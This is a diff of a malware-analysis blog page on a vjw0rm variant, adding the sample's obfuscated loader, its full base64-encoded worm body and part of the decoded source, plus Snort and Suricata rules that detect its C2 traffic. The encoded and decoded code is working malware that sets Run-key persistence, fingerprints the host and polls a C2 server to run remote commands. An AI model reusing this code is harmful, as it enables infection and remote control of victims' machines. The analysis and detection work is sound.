@@ -73,7 +73,6 @@
 <meta property="article:published_time" content="2022-11-29T00:00:00+00:00" />
 <meta property="article:modified_time" content="2022-11-29T00:00:00+00:00" /><meta property="og:site_name" content="Malware Analysis: Or How I Learned To Love Frustration" />
 
-
   <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://polaryse.github.io/posts/vjw0rm/featured.png"/>
 <meta name="twitter:title" content="Starting Small: Analysis of recent vjw0rm variant"/>
@@ -104,7 +103,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "3423"
+    "wordCount": "3700"
   }]
   </script>
 
@@ -496,7 +495,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2022-11-29 00:00:00 &#43;0000 UTC">November 29, 2022</time><span class="px-2 text-primary-500">&middot;</span><span>3423 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">17 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2022-11-29 00:00:00 &#43;0000 UTC">November 29, 2022</time><span class="px-2 text-primary-500">&middot;</span><span>3700 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">18 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
   
@@ -664,8 +663,32 @@
     
 </h2><p>I started this task with your basic static protocols. I had a bit of a squiz at the thing in Notepad++. Initially it was a visual nightmare, a bunch of randomly named functions, with some wild, random blobs of data.  I ended up installing a nice JS plugin called &ldquo;JSTool&rdquo; to help visualise and format this code so that my eyeballs didn&rsquo;t bleed from the chonk of the thing.</p>
 <p><em>Although I later learned that Cyberchef has the same function, if not actually better than this plugin, so I actually completed this step again using the output from that tool.</em></p>
-<p>![[Pasted image 20230122145948.png]]
-<em>Figure 1: Look at that delightful formatting from Cyberchef.io</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_8</span>, <span style="color:#a6e22e">_1</span>, <span style="color:#a6e22e">_0x2162</span>, <span style="color:#a6e22e">_2</span>, <span style="color:#a6e22e">_7</span>, <span style="color:#a6e22e">_6</span>, <span style="color:#a6e22e">_5</span>, <span style="color:#a6e22e">_9</span>, <span style="color:#a6e22e">superString</span>, <span style="color:#a6e22e">xmlDOM</span>, <span style="color:#a6e22e">_0x2ebc</span>, <span style="color:#a6e22e">_4</span>, <span style="color:#a6e22e">comObject</span>, <span style="color:#a6e22e">_3</span>;
+</span></span><span style="display:flex;"><span>(<span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_$af1389795</span>() {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">V</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x2162</span>, <span style="color:#a6e22e">R</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x2ebc</span>();;) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_$af1389802</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">_$af1389797</span>(<span style="color:#66d9ef">true</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">_$af1389808</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">_$af1389806</span>) {
+</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">_$af1389813</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>					}
+</span></span><span style="display:flex;"><span>					;
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">603220</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">136</span>)) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">150</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> (parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">131</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">148</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">130</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">171</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">159</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">133</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> (parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">128</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">9</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">157</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">10</span>) {
+</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>					}
+</span></span><span style="display:flex;"><span>					;
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">R</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">R</span>.<span style="color:#a6e22e">shift</span>());
+</span></span><span style="display:flex;"><span>				} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">V</span>) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">R</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">R</span>.<span style="color:#a6e22e">shift</span>());
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p><em>Figure 1: Look at that delightful formatting from Cyberchef.io</em></p>
 <p>In my initial scan, I looked for key identifiers that could help me understand <em>what exactly</em> this script was doing. Immediately, nothing really makes sense, so it is easy to say that this is obfuscated.</p>
 <p>The function that immediately warranted further investigation was <code>_$af13899809</code> with a variable that contained a chunk of intriguing code.</p>
 <pre tabindex="0"><code>Ly8gQ29kZWQgYnkgdl9CMDEgfCBTbGllbWVyZXogLT4gVHdpdHRlci&lt;_6IFNsaWVtZXJleg0KDQp2YXIgai&lt;_9IFsiV1NjcmlwdC5TaGVsbCIsIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IiwiU2hlbGwuQXBwbGljYXRpb24iLCJNaWNyb3NvZnQuWE1MSFRUUCJdOw0KdmFyIGcgPSBbIkhLQ1UiLCJIS0xNIiwiSEtDVVxcdmp3MHJtIiwiXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuXFwiLCJIS0xNXFxTT0ZUV0FSRVxcQ2xhc3Nlc1xcIiwiUkVHX1NaIiwiXFxkZWZhdWx0aWNvblxcIl07DQp2YXIgeS&lt;_9IFsid2lubWdtdHM6Iiwid2luMzJfbG9naWNhbGRpc2siLCJXaW4zMl9PcGVyYXRpbmdTeXN0ZW0iLCdBbnRpVmlydXNQcm9kdWN0J107DQoNCnZhciBzaC&lt;_9IENyKD&lt;_pOw0KdmFyIGZzID0gQ3IoMSk7DQp2YXIgc3BsID0gInxWfCI7DQp2YXIgQ2ggPS&lt;_iXFwiOw0KdmFyIFZOID0gIjkvMjEiICsgIl8iICsgT2IoNik7DQp2YXIgZnUgPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lOw0KdmFyIHduID0gV1NjcmlwdC5TY3JpcHROYW1lOw0KdmFyIFU7DQp0cnkgew0KVS&lt;_9IHNoLlJlZ1JlYWQoZ1syXSk7DQp9IGNhdGNoKGVycikgew0KdmFyIHN2ID0gZnUuc3BsaXQoIlxcIik7DQppZi&lt;_oIjpcXCIgKyBzdlsxXS&lt;_9PS&lt;_iOlxcIi&lt;_rIHduKSB7DQpVID0gIlRSVUUiOw0Kc2guUmVnV3JpdGUoZ1syXSxVLGdbNV0pOw0KfSBlbHNlIHsNClUgPS&lt;_iRkFMU0UiOw0Kc2guUmVnV3JpdGUoZ1syXSxVLGdbNV0pOw0KfQ0KfQ0KTnMoKTsNCmRvIHsNCnRyeSB7DQp2YXIgUC&lt;_9IFB0KCdWcmUnLCcnKTsNCl&lt;_gPSBQLnNwbGl0KHNwbCk7DQoNCmlmIChQWzBdID09PS&lt;_iQ2wiKSB7DQpXU2NyaXB0LlF1aXQoMSk7DQp9DQoNCmlmIChQWzBdID09PS&lt;_iU2MiKSB7DQp2YXIgczIgPSBFeCgidGVtcCIpICsgIlxcIi&lt;_rIFBbMl07DQp2YXIgZmkgPSBmcy5DcmVhdGVUZXh0RmlsZShzMix0cnVlKTsNCmZpLldyaXRlKFBbMV0pOw0KZmkuQ2xvc2UoKTsNCnNoLnJ1bihzMik7DQp9DQoNCmlmIChQWzBdID09PS&lt;_iRXgiKSB7DQpldmFsKFBbMV0pOw0KfQ0KDQppZi&lt;_oUFswXS&lt;_9PT0gIlJuIikgew0KdmFyIHJpID0gZnMuT3BlblRleHRGaWxlKGZ1LDEpOw0KdmFyIGZyID0gcmkuUmVhZEFsbCgpOw0KcmkuQ2xvc2UoKTsNClZOID0gVk4uc3BsaXQoIl8iKTsNCmZyID0gZnIucmVwbGFjZShWTlswXSxQWzFdKTsNCnZhciB3aS&lt;_9IGZzLk9wZW5UZXh0RmlsZShmdSwyLGZhbHNlKTsNCndpLldyaXRlKGZyKTsNCndpLkNsb3NlKCk7DQpzaC5ydW4oIndzY3JpcHQuZXhlIC8vQiBcIiIgKyBmdS&lt;_rICJcIiIpOw0KV1NjcmlwdC5RdWl0KDEpOw0KfQ0KDQppZi&lt;_oUFswXS&lt;_9PT0gIlVwIikgew0KdmFyIHMyID0gRXgoInRlbX&lt;_iKS&lt;_rICJcXCIgKyBQWzJdOw0KdmFyIGN0Zi&lt;_9IGZzLkNyZWF0ZVRleHRGaWxlKHMyLHRydWUpOw0KdmFyIGd1ID0gUFsxXTsNCmd1ID0gZ3UucmVwbGFjZSgifFV8IiwifFZ8Iik7DQpjdGYuV3JpdGUoZ3UpOw0KY3RmLkNsb3NlKCk7DQpzaC5ydW4oIndzY3JpcHQuZXhlIC8vQiBcIiIgKyBzMi&lt;_rICJcIiIsNik7DQpXU2NyaXB0LlF1aXQoMSk7DQp9DQoNCmlmIChQWzBdID09PS&lt;_iVW4iKSB7DQp2YXIgczIgPSBQWzFdOw0KdmFyIHZkci&lt;_9IGZ1Ow0KdmFyIHJlZ2kgPS&lt;_iTm90aGluZyEiOw0KczIgPSBzMi5yZXBsYWNlKCIlZiIsZnUpLnJlcGxhY2UoIiVuIix3bikucmVwbGFjZSgiJXNmZHIiLHZkcikucmVwbGFjZSgiJVJnTmUlIixyZWdpKTsNCmV2YWwoczIpOw0KV1NjcmlwdC5RdWl0KDEpOw0KfQ0KDQppZi&lt;_oUFswXS&lt;_9PT0gIlJGIikgew0KdmFyIHMyID0gRXgoInRlbX&lt;_iKS&lt;_rICJcXCIgKyBQWzJdOw0KdmFyIGZpID0gZnMuQ3JlYXRlVGV4dEZpbGUoczIsdHJ1ZSk7DQpmaS5Xcml0ZShQWzFdKTsNCmZpLkNsb3NlKCk7DQpzaC5ydW4oczIpOw0KfQ0KfSBjYXRjaChlcnIpIHsNCn0NCldTY3JpcHQuU2xlZX&lt;_oNz&lt;_wMCk7DQoNCn0gd2hpbGUgKHRydWUpIDsNCg0KDQpmdW5jdGlvbiBFeChTKSB7DQpyZXR1cm4gc2guRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzKCIlIi&lt;_rIFMgKy&lt;_iJSIpOw0KfQ0KZnVuY3Rpb24gUHQoQyxBKSB7DQp2YXIgWC&lt;_9IENyKDMpOw0KWC5vcGVuKCdQT1NUJywnaHR0cDovL2phdmFhdXRvcnVuLmR1aWEucm86NTQ2NS8nICsgQywgZmFsc2UpOw0KWC5TZXRSZXF1ZXN0SGVhZGVyKCJVc2VyLUFnZW50OiIsbmYoKSk7DQpYLnNlbmQoQSk7DQpyZXR1cm4gWC5yZXNwb25zZXRleHQ7DQp9DQoNCg0KZnVuY3Rpb24gbmYoKSB7DQp2YXIgcyxOVCxpOw0KaWYgKGZzLmZpbGVleGlzdHMoRXgoIldpbmRpciIpICsgIlxcTWljcm9zb2Z0Lk5FVFxcRnJhbWV3b3JrXFx2Mi4wLjUwNzI3XFx2YmMuZXhlIikpIHsNCk5UID0iWUVTIjsNCn0gZWxzZSB7DQpOVC&lt;_9ICJOTyI7DQp9DQpzID0gVk4gKyBDaC&lt;_rIEV4KCJDT01QVVRFUk5BTUUiKS&lt;_rIENoICsgRXgoIlVTRVJOQU1FIikgKyBDaC&lt;_rIE9iKDIpICsgQ2ggKyBPYig0KS&lt;_rIENoICsgQ2ggKyBOVC&lt;_rIENoICsgVS&lt;_rIENoOw0KcmV0dXJuIHM7DQp9DQoNCmZ1bmN0aW9uIENyKE4pIHsNCglyZXR1cm4gbmV3IEFjdGl2ZVhPYmplY3QoaltOXSk7DQp9DQoNCmZ1bmN0aW9uIE9iKE4pIHsNCnZhciBzOw0KaWYgKE4gPT0gMikgew0Kcy&lt;_9IEdldE9iamVjdCh5WzBdKS5JbnN0YW5jZXNPZih5WzJdKTsNCnZhciBlbi&lt;_9IG5ldyBFbnVtZXJhdG9yKHMpOw0KZm9yICg7ICFlbi5hdEVuZCgpO2VuLm1vdmVOZXh0KCkpIHsNCnZhciBpdC&lt;_9IGVuLml0ZW0oKTsNCnJldHVybiBpdC5DYXB0aW9uOw0KYnJlYWs7DQp9DQp9DQppZi&lt;_oTi&lt;_9PS&lt;_0KSB7DQp2YXIgd21nID0gIndpbm1nbXRzOlxcXFxsb2NhbGhvc3RcXHJvb3RcXHNlY3VyaXR5Y2VudGVyIjsNCnMgPSBHZXRPYmplY3Qod21nKS5JbnN0YW5jZXNPZih5WzNdKTsNCnZhciBlbi&lt;_9IG5ldyBFbnVtZXJhdG9yKHMpOw0KZm9yICg7ICFlbi5hdEVuZCgpO2VuLm1vdmVOZXh0KCkpIHsNCnZhciBpdC&lt;_9IGVuLml0ZW0oKTsNCnZhciBzdHIgPSBpdC5EaXNwbGF5TmFtZTsNCn0NCmlmIChzdHIgIT09ICcnKSB7DQp3bWcgPSB3bWcgKy&lt;_iMiI7DQpzID0gR2V0T2JqZWN0KHdtZykuSW5zdGFuY2VzT2YoeVszXSk7DQplbi&lt;_9IG5ldyBFbnVtZXJhdG9yKHMpOw0KZm9yICg7ICFlbi5hdEVuZCgpO2VuLm1vdmVOZXh0KCkpIHsNCml0ID0gZW4uaXRlbSgpOw0KcmV0dXJuIGl0LkRpc3BsYXlOYW1lOw0KfQ0KfSBlbHNlIHsNCnJldHVybiBpdC5EaXNwbGF5TmFtZTsNCn0NCn0NCmlmIChOPT02KSB7DQpzID0gR2V0T2JqZWN0KHlbMF0pLkluc3RhbmNlc09mKHlbMV0pOw0KdmFyIGVuID0gbmV3IEVudW1lcmF0b3Iocyk7DQpmb3IgKDsgIWVuLmF0RW5kKCk7ZW4ubW92ZU5leHQoKSkgew0KdmFyIGl0ID0gZW4uaXRlbSgpOw0KcmV0dXJuIGl0LnZvbHVtZXNlcmlhbG51bWJlcjsNCmJyZWFrOw0KfQ0KfQ0KfQ0KDQpmdW5jdGlvbiBOcygpIHsNCgkNCgkNCgkNCgl0cnkgew0KCQl2YXIgYX&lt;_gPSBDcigyKTsNCgkJZnMuQ29weUZpbGUoZnUsIGFwLk5hbWVTcGFjZSg3KS5TZWxmLlBhdGggKy&lt;_iXFwiICsgd24sdHJ1ZSk7DQoJfSBjYXRjaChlcnIpIHsNCgl9DQp9DQoNCg0K
@@ -754,32 +777,38 @@ WScript.Quit(1);
 </h3><p>Now, this seems and feels simple here, but the key piece of information I have left out until this point is <em>slightly embarassing</em>. We&rsquo;ve all done it, but I actually had the syntax wrong for our dear friend WScript. I forgot to capitalise the S in script, which left me with an <code>Undefined Error</code>.</p>
 <p>Classically, instead of actually listening to the sage wisdom of said error, I went on a stackoverflow hunt to solve the bamboozle which served to not really answer anything. A quick break, a look at some <em>legitimate</em> WScript calls in random scripts, and a facepalm later, I changed the command and the darn thing worked.</p>
 <p>Execution of this resulted in a pop up in WScript Host.</p>
-<p>
-
-
-
-  
-  
-    
-  
-  
-    <figure>
-      <img
-        class="my-0 rounded-md"
-        srcset="
-          /posts/vjw0rm/wscript_output_hu9bd329eea67948720590e73214e9e1cb_113461_330x0_resize_box_3.png 330w,
-          /posts/vjw0rm/wscript_output_hu9bd329eea67948720590e73214e9e1cb_113461_660x0_resize_box_3.png 660w,
-          /posts/vjw0rm/wscript_output_hu9bd329eea67948720590e73214e9e1cb_113461_1024x0_resize_box_3.png 1024w,
-          /posts/vjw0rm/wscript_output_hu9bd329eea67948720590e73214e9e1cb_113461_1320x0_resize_box_3.png 2x"
-        src="/posts/vjw0rm/wscript_output_hu9bd329eea67948720590e73214e9e1cb_113461_660x0_resize_box_3.png"
-        alt="WScript"
-      />
-      
-    </figure>
-  
-
-
-<em>Figure 6: WScript Output received through execution of file</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Coded by v_B01 | Sliemerez -&gt; Twitter : Sliemerez
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;WScript.Shell&#34;</span>,<span style="color:#e6db74">&#34;Scripting.FileSystemObject&#34;</span>,<span style="color:#e6db74">&#34;Shell.Application&#34;</span>,<span style="color:#e6db74">&#34;Microsoft.XMLHTTP&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;HKCU&#34;</span>,<span style="color:#e6db74">&#34;HKLM&#34;</span>,<span style="color:#e6db74">&#34;HKCU\\vjw0rm&#34;</span>,<span style="color:#e6db74">&#34;\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\&#34;</span>,<span style="color:#e6db74">&#34;HKLM\\SOFTWARE\\Classes\\&#34;</span>,<span style="color:#e6db74">&#34;REG_SZ&#34;</span>,<span style="color:#e6db74">&#34;\\defaulticon\\&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">y</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;winmgmts:&#34;</span>,<span style="color:#e6db74">&#34;win32_logicaldisk&#34;</span>,<span style="color:#e6db74">&#34;Win32_OperatingSystem&#34;</span>,<span style="color:#e6db74">&#39;AntiVirusProduct&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Cr</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Cr</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">spl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;|V|&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">Ch</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\\&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">VN</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;9/21&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ob</span>(<span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptName</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">U</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegRead</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fu</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\\&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;:\\&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sv</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;:\\&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">wn</span>) {
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;TRUE&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>],<span style="color:#a6e22e">U</span>,<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">5</span>]);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FALSE&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>],<span style="color:#a6e22e">U</span>,<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">5</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Ns</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">P</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Pt</span>(<span style="color:#e6db74">&#39;Vre&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">P</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">P</span>.<span style="color:#a6e22e">split</span>(<span style="color:#a6e22e">spl</span>);
+</span></span></code></pre></div><p><em>Figure 6: WScript Output received through execution of file</em></p>
 <p>Well, well, well. This definitely looks a lot better than our first attempt via base64 decoding. The variables are all there and there is no funky encoding dramas this time around. I decided to run the command again, piping the output of the command into a file on disk to investigate further.</p>
 <pre tabindex="0"><code># moved to cscript to execute so it boops into a file. 
 # comparing the pair, I also just like cscript output better... 
@@ -1134,12 +1163,15 @@ WScript.Quit(1);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">alert http any any -&gt; 41.217.29.212 5465 (msg</span>: <span style="color:#e6db74">&#34;vjw0rm C2 contacted by endpoint&#34;</span><span style="color:#ae81ff">)</span>
 </span></span></code></pre></div><p>The problem with the above rules is that if the malware author moves or changes their C2 infrastructure, these rules will no longer fire. The better approach here is to write a rule specifically targeting the C2 domain address or better yet, target the User-Agent String portion of the http packet and match on information that is always sent to the C2 domain. Attempts to achieve this appear below:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>alert 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-YAML" data-lang="YAML"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># blocking through host </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">alert http $HOME_NET any -&gt; $EXTERNAL_NET any (http_header</span>: <span style="color:#ae81ff">field; host; content:&#34;javaautorun.duia.ro&#34;;)</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>block tcp (msg:<span style="color:#e6db74">&#34;block vjw0rm C2&#34;</span> http_uri; content: <span style="color:#e6db74">&#34;javaautorun.duia.ro&#34;</span>, nocase; service:http; sid:<span style="color:#ae81ff">1</span>;)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># alerting through user-agent string unique identifier </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg</span>: <span style="color:#e6db74">&#34;vjworm C2 contacted&#34;</span><span style="color:#ae81ff">; content:&#34;9\21&#34;; http_user_agent;)</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">#</span> alternative rule, blocking through host 
-</span></span><span style="display:flex;"><span>block tcp any any <span style="color:#f92672">-&gt;</span> any any (http_header: field host; content:<span style="color:#e6db74">&#34;javaautorun.duia.ro&#34;</span>;)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># alerting through POST request to /Vre URI</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg</span>: <span style="color:#e6db74">&#34;vjworm C2 contacted&#34;</span><span style="color:#ae81ff">; flow:established,to_server; content:&#34;POST&#34;; nocase; http_method; uricontent:&#34;/Vre&#34;;)</span>
 </span></span></code></pre></div><div id="suricata" class="anchor">Suricata></div>
 <h4 class="relative group">Suricata 
     <span
@@ -1153,7 +1185,11 @@ WScript.Quit(1);
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Filter on the host parameter of the c2 domain</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># case insensitive</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">drop http any any -&gt; any 5465 (msg:&#34;vjworm C2 comms&#34;; content: &#34;javaautorun.duia.ro&#34;; http_host; nocase; sid:1;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># matching on PORT command with URI, and user-agent string. this is campaign specific</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&#34;vjworm C2 contacted&#34;; content:&#34;9\21&#34;; http_user_agent; content:&#34;POST &#34;; http_method; content:&#34;/Vre&#34;; http.uri)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># matching on POST command with URI /Vre </span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&#34;vjworm C2 contacted&#34;; content:&#34;POST &#34;; http_method; content:&#34;/Vre&#34;; http.uri)</span>
 </span></span></code></pre></div><div id="yara-signature" class="anchor">YARA Signature></div>
 <h3 class="relative group">YARA Signature 
     <span
